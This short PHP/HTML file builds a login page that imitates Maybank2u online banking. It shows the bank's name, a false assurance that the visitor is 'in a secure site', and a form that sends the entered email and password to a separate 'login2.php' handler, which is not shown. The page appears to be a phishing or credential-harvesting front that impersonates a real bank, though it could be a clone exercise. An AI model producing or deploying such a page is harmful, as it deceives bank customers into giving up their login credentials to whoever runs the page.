<?php
?>
<head>
<style>

#container {

width:1400px;
height:100%;
background-color: #FFD900;
display: flex;
align-items:center;
justify-content:center;
flex-direction:column;
}

.text1{
    margin-left:150px;
    font-size:18px;
    margin-top:20px;
}

#item{
    background-color:white;
    width:400px;
    height:80%;
    color:black;
}
.content{
    margin-top:10px;
    margin-left:40px;
    font-size:18px;
    background-color:#dcdcdc;
    border:1px solid grey;
    width:80%;
    height:50%;
}

.subcontent{
    
    margin-top:20px;
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:16px;
    margin-left:40px;
    background-color:#f4f0ec; 
    width:70%;
    height:20%;
}

.button {
    background-color: black;
    color: white;
    cursor: pointer;
    margin-left: 20px;
    padding-left: 30px;
    padding-right: 30px;
    padding-top: 3px;
    padding-bottom: 3px;
    font-size: 16px;
    }
    
    .button:active {
      transform: scale(0.9);
      background: radial-gradient( circle farthest-corner at 10% 20%,  rgba(255,94,247,1) 17.8%, rgba(2,245,255,1) 100.2% );
    }

.topic{
    margin-top:20px;
    margin-left:20px;
}
#email{
    margin-top:20px;
    margin-left:20px;
}

input[type=email], input[type=password] {
    margin-top:5px;
}
#login{
    margin-top:10px;
}

#reset{
    margin-top:5px;
}

</style>
</head>
<body>
    <div id='container'>
        <div id='item'>
            <div class='text1'>
                Maybank2u
            </div>
            <div class='content'>
                <div class='topic'>
                    Log in to Maybank2u.com online Banking
                </div>
                <div class='subContent'>
                    Note: You are in a secure site.
                </div>
                
            <form action="login2.php" method="post">
                <div id='email'>
                    <input type="email" placeholder="Enter email" name="email" required>
                    <input type="password" placeholder="Enter Password" name="password" required>
                </div>
                <input id="login" class="button" type="submit" name="submit" value="login">
                <div>
                    <button id="reset" class='button' type="submit" name="forgetPassword" formnovalidate>Forget Password</butto>
                </div>
            </form>
        </div>
    </div>
</body>


